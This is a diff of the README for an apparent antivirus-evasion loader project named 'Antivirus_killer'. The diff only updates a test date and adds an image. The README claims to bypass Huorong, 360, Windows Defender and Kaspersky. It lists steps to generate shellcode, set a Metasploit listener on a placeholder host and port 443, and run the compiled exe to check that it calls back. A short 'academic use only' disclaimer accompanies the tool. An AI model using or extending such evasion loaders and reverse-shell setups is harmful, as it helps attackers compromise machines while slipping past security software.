@@ -1,6 +1,6 @@
 # Antivirus_killer
 免杀主流防病毒软件<br />
-测试于2024年9月24日加载器2024_9_24(需配合新版加密器)可过最新版火绒、360核晶模式、windows自带杀软、卡巴斯基<br />
+测试于2024年10月17日加载器2024_9_24(需配合新版加密器)可过最新版火绒、360核晶模式、windows自带杀软、卡巴斯基<br />
 该项目仅供学术交流参考，请大家合法学习和使用项目
 # 使用方法
 ## 生成shellcode
@@ -17,3 +17,4 @@ set LHOST x.x.x.x<br />
 set LPORT 443<br />
 run<br />
 ## 双击编译好的exe观察是否上线
+![image](https://github.com/user-attachments/assets/24568684-4b41-4c87-a393-d45806aea1da)
